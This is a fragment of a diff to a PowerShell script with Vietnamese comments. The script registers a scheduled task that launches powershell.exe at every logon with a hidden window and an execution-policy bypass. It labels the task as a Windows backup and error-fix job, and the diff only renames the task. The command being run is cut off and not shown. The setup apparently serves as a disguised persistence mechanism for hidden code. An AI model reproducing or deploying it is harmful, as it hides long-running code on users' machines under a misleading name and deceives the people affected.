@@ -4,7 +4,7 @@ $arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `&
 
 $task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $arguments
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_name = "Automatic Backup Windows"  # Thay đổi giá trị này thành một tên duy nhất cho tác vụ
+$task_name = "Automatic Backup Windows V2"  # Thay đổi giá trị này thành một tên duy nhất cho tác vụ
 $task_desc = "Always Backup & Fix If Windows ERROR."
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 
